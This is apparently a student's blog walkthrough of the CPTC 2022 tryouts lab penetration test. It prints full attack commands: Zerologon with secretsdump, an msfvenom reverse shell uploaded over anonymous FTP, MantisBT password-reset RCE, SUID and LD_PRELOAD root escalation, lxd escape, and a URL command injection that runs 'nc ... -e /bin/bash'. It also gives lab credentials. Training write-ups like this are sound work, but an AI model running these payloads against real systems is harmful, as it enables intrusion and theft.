---
layout:      page
sitemap:     true
image: /assets/img/2022-CPTC.png
---

<!--Adds the glitch effect -->
<section>

  <link rel="stylesheet" href="/style.css">
  <div class="hero-container">
	<h1 class="hero glitch layers" data-text="CPTC 2022 Tryouts" style="position: absolute; top: 0px; left: 0px; margin-top: 0px;">
  	<span>CPTC 2022 Tryouts</span></h1>
  </div>

</section>
<!--this css code will fix all color issues -->
<link rel="stylesheet" href="/hydejack-9.1.6.css">

<div class="image-container">
  <img src="/assets/img/2022-CPTC.png" alt="IT Competition" class="competition-image">
</div>

<style>
.image-container {
  margin-top: 40px; /* Adjust the value as needed to create space below the title */
  text-align: center; /* Centers the image, optional */
}

.normal-photo {
  margin-top: 20px;
  margin-bottom: 20px;
  text-align: center; /* Centers the image, optional */
}

.competition-image {
  max-width: 100%; /* Ensures the image is responsive */
  height: auto;
}

body {
  background-color: #2b2b2b;
}
</style>

* this text will be replaced
{:toc}

## Overview
---
In this environment I was given the vpn profile to connect to the network and I had to hack the network using my own Kali VM. I had no information about the network. Only that the subnet was 172.16.199.0/24, and that there was a website I had to visit in order to input codes that I get from each of the vulnerable machines. There were some struggles and bugs that held me back, but with the help of my mentor, Derrick Tran, I was told what would've happened if things worked properly. 

Because I'm lazy there won't be any pictures, but I will describe my thought process and actions as much as I can. Keep in mind I did this environment a while ago and this is all based off memory (which mine sucks).

## Windows (172.16.199.112)
---
I first did a host discovery scan by doing "nmap -sn 172.16.199.0/24" this quickly gave me the hosts 172.16.199.112 (windows), 172.16.199.10 (linux), and 172.16.199.1 (the router which is out of scope). I was given 172.16.199.113 (desolator) because no matter what I did, it didn't show up as an ip address. 

Some services the windows computer had was 
1. http server
2. ftp server
3. SSH for windows?
4. SMB (I think)
5. Typical windows service (ldap, rpc, kerberos, etc.)

Because this is a windows machine, I tried to enumerate users using a tool called kerbrute. This tool uses a dictionary attack to enumerate users over kerberos. This enumeration yeilded nothing because the usernames were unordinary and weren't in the SecLists wordlists

I also tried enumerating subdomains and directories for the website, but nothing showed up. As a result, I figured the vulnerability had to be within ther services itself. 

### Zerologon
This was a last resort exploit that I performed due to the actual path being bugged. I'm writing what worked first and what should've happened last. 

In actual engagements, you should'nt perform zerologon because it actually breaks the DC a bit. This is something you use the tester sciript only and note it rather than using to gain access. 

Exploiting zerologon is very easy. I first used the zerologon tester from SecuraBV's zerologon tester. After verifying that the machine is vulnerable, I ran the script from dirkjanm's github. 

~~~bash
#The netbios name was quite random. It was like WIN####### which to me is unusual, but it can be found with an nmap scan. 
python3 zerologon_tester.py (NetBIOS name) 172.16.199.112

#Exploit script:
python3 cve-2020-1472-exploit.py (NetBIOS name) 172.16.199.112
impacket-secretsdump -no-pass -just-dc (NetBIOS)\$@172.16.199.112

#Password recovery: (hash is just an example)
impacket-secretsdump Administrator@172.16.199.112 -hashes aad3b435b51404eeaad3b435b51404ee:dfea5bffeee342a017c42b371af23151
#Copy the hexhash and open metasploit
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
set action restore
set nbname (netbios name)
set rhosts 172.16.199.112
run
#With this you should've successfully reset all the passwords correctly. 
~~~

## Kerberoast and AsrepRoast
After finding out the usernames through Zerologon, I ran tests and found out that the user J.Saltman was vulnerable to AsrepRoasting and the service users hfs_svc and VNC_svc were kerberoastable. Since I already got admin access to the machine, I didn't really explore the kerberoastable users. I simply created a reverse shell for J.Saltman and used Metasploit's Exploit Suggester in order to find possible priv esc vulnerabilties. 

### Exploit Suggester
In metasploit there is a tool called exploit suggester where you background a meterpreter session and metasploit uses the session to scan for priv esc vulnerabilities. This takes a couple minutes to run, but it's very effective if you don't know what to do next. Sadly, the suggester found possible exploits, but none of them worked. It is possible that I had to login as VNC_svc and priv esc from that user, but I didn't test it. 

VNC_svc was a valid user on the machine who had their own Users directory. Also, when looking through bloodhound, it was revealed that VNC_svc was a high value target, which is why I mentioned my previous idea. 

### Anonymous FTP Share
This is the path that was bugged. The windows machine hosted an FTP server. It allowed anonymous ftp and a directory I noticed was the aspnet_client directory. What's supposed to happen was that attackers could visit the files that were displayed on the ftp server. 

This is vulnerable because the website was using aspnet which uses .aspx files. An attacker can create a malicious .aspx file using the tool msfvenom and spawn a reverse shell. 

So, the attacker creates a malicious .aspx file with msfvenom, uploads it to the ftp server, creates a listener using metasploit, and visit the file through the web server. You can refer to the "Devel" Hack the Box walkthrough for more information. 

~~~bash
#create malicious file
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your ip> LPORT=4444 -f aspx > payload.aspx
ftp anonymous@172.16.199.112
put payload.aspx
#metasploit listener
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost (your ip)
set lport 4444
run
#visit the website & revisit metasploit
#You should've gotten a meterpreter connection. 
~~~

Now, I don't know what user you will be, but you will most likely be an unprivileged user like J.Saltman or something. In this case, you would use the exploit suggester again to find priv esc vulnerabilies. 

I believe I ended up finding the script for the code under the administrator user, which makes sense. The script itself wouldn't run, so I simily cat/type out the script to see what the activation code was and copied it. 

## Linux (172.16.199.10)
---
There were 2 main exploits to gain access to the linux machine. They both work together in order to successfully gain access. The services that were active on the linux machine were
1. ssh
2. http (some odd port like 8080 or 5000)

### Administrator Password Reset
I visited the website and notice that it was running MantisBT. I looked up the website MantisBT and found out it was a website outline similar to gitlab. So, I figured I would look up the website on metasploit. I found various exploits, and after trying all of them, only one worked. It was auxiliary/admin/http/mantisbt_password_reset. As the name suggests, it resets the password of the administrator. I used this to gain access to the administrator user and looked around, but there was nothing. I found an exploit that would give you a reverse shell onto the machine, but doing it manually on the website didn't work for me. 

### Remote Code Execution (RCE)
I looked into the exloit more and found a script from exploitdb. I copied the script and modified it in the specified places for my own needs. So, I changed the ip address, the password it would reset to, attacker ip, attacker port, etc. When i first ran it with python3, it gave me a lot of syntax errors. It turns out that this script runs on python2.7 rather than the noted python3. 

So what this script essentially does is it resets the password for the administrator user like before, but then it creates an irregular config profile. The user would then visit the /workflow_graph_img.php directory and be able to list files in the /tmp directory as mentioned in https://mantisbt.org/bugs/view.php?id=26091

However, the script does a bit more. I assume it does this, but it also uploads a reverse shell to the /tmp (or whatever directory) and executes it through the url, similar to the anonymous ftp vulnerability for the windows machine. 

This effectively gives you shell access to the linux machine as the user, saul

### OSINT
There was an OSINT section in this environment, but it was taken down a while ago. In essence you would look up the user Saul Solper and find his password through doxbin (I think). Saul's password was given to me so I didn't have to look for it.  

Password: vW6BuFs?v6H^gwH.^jcupX_

With this you can ssh into saul and have a more stable shell. 

### Exploit Suggester
Same thing with the windows machine, I created a meterpreter reverse shell and used metasploit exploit suggester to find vulnerabilities. This time I got some resutls.

The working vulnerabilites were dirtypipe and cve_2021_3493_overlayfs

There's not really an explanation for this as it's just use and go, but feel free to look into them if you want. 

### Base64 SUID
I uploaded the tool linpeas to the linux machine. This is a tool designed to find different attack vectors for privesc. It looks at things like SUID bits, CVE's, unusual permissions or groups, etc. One of the things it found was the SUID bit on the base64 command. 

Since this was an unusual command that uses SUID, and it was highligheted by linpeas, I decided to look into it with GTFObin. GTFObin is a website that details various ways to escalate privileges with different commands/permissions to commands. Commonly, all of them use SUID. 

~~~bash
export LFILE=(path of file you want to read)
/usr/bin/base64 "$LFILE" | base64 --decode
~~~

So, what this exploit does is it encodes the file that you want to read (in this case, LFILE). Since it has SUID permissions, it can read any file on the computer. Including files in the root directory. In the root directory there was a file called Passwords (or something like that). Anyways, I obviously want to read the file. So I specify the file path /root/password and export that to the variable LFILE. The commands listed above encrypts the password file, and due to base64's nature, it outputs the data when it decrypts the file. This way we can see the contents inside the password file. 

The passwords I received were encrypted, so I put it into chatgpt and it told me it was md5 encryption, which is very weak. After decrypting it with hashcat it I found out the passwords for root and chet were root:gangsta and chet:orbital#1

I could also use this exploit to see the activation code for the file that the user riki owned. 

### lxd Group Permission
Saul had dangerous group permissions to lxd. A normal user shouldn't have access to this group. I wasn't able to do this exploit because the environment bugged out, but I will show how to do it.

Most of this is copied from HackTrick's lxd/lxc priv esc

~~~bash
sudo su
#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

#Clone repo
git clone https://github.com/lxc/distrobuilder

#Make distrobuilder
cd distrobuilder
make

#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

#Create the container (This is DIFFERENT from HackTricks and other tutorials)
sudo $HOME/go/bin/distrobuilder build-incus --type=split alpine.yaml -o image.release=3.18

#Upload both files to the victim user, then:
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers (lxc list is optional)
lxc list
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

#Execute the priv esc
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
~~~

Now, I'm not sure if this is 100% correct, but when I compare it to other videos of the exploit, the files were the same names and everything. So take this information as you will. 

## Desolator (172.16.199.113)
---
I was given this ip address because my nmap wasn't showing finding it for some reason. The only services are ssh and http. Since we most likely won't brute force ssh into the machine, we have to look through the website.

This website is where you upload the codes that you found so far. Now somewhere along the way there was a file called documentation.txt. This might've been in the window's ftp. This file shows you how to use the website and upload your files, as well as use the other directories that are on this website. 

In the documentation file it shows the directories: /api/v3/enable and /api/v3/authorize and they both use the parameters "code". Typically when you use parameters in the url, you use ? to start the use of parameters. 
So in the url we add/change: (At least I think this is the syntax)
~~~
/api/v3/enable?code=(linux code)
/api/v3/authorize?code=(windows code)
~~~
Then, if you look back at the api/v3/uplink directory, both codes should be active.

And now you're done! 
Or are you?

### URL Injection
The SoW never mentioned anything about not hacking the desolator machine. So why don't we try hacking it?

If you look back at the documentation file, you see that /api/v1/connection is deemed insecure. It takes the parameter ip and it pings the specified ip address. This took me a lot longer than it should've. 

So, we know that the machine is linux because of nmap. We also know that it takes parameters to send ping requests. So, we can make the assumption that we can use basic linux syntax to manipulate the url. What are some linux "symbols" that can be used to move on to the next line of code? My second third thought was the "||" symbol which stands for OR in bash. So, with this, how can we make it so that the command moves onto the next code? Well we have to make it so the first command is false/invalid.

We can provide an invalid ip address by basically typing anything. So our syntax will be:
~~~
172.16.199.113:5000/api/v1/connection?ip=bciejfnve || echo hello
~~~

This should output hello to the website. If this works we can then do
~~~
nc -lvnp 4444
172.16.199.113:5000/api/v1/connection?ip=bciejfnve || nc (attacker ip) 4444 -e /bin/bash

If you need a more stable shell for some reason, run:
python3 -c 'import pty;pty.spawn("/bin/bash")'
~~~

With this, you have a clean reverse shell on some user. I forgot who.

### Python SUID
Anyways, if you use linpeas again, you will see another highlighed suid for the python binary. With this you can priv esc by doing:
~~~bash
#change the python version as necessary. Everything else is the same. 
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'
~~~

### ld_preload
If we do "sudo -l" to check our sudo permissions, we will see "env_keep+=LD_PRELOAD" and some other sudo permissions like:

(ALL) NOPASSWD: /usr/sbin/ufw
(ALL) NOPASSWD: /opt/server_status.sh
(SETENV) NOPASSWD: /usr/sbin/ufw
(SETENV) NOPASSWD: /opt/server_status.sh

As long as you have sudo access to a commond OR script where we can set the environment variable of, you can escalate your privileges.

Add this code to a file called exploit.c file: (the file name can be anything)
~~~
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
    	unsetenv("LD_PRELOAD");
    	setuid(0);
    	setgid(0);
    	system("/bin/bash -p");
    	}
~~~

Compile the code by doing:
~~~
gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
~~~

Upload the file to the victim computer and run:
~~~bash
sudo exploit.so /opt/server_status.sh
~~~

And you should have root. 

## Conclusion
Overall, this was a very well made environment. I learned a lot about what to expect and various tools and methodology. There were some things that I was told, but didn't do. For example there was a script that Riki owned on the linux machine, and saul had group rwx access to the script. There was something there but I couldn't find it. There were some other stuff, but I forgot what they were.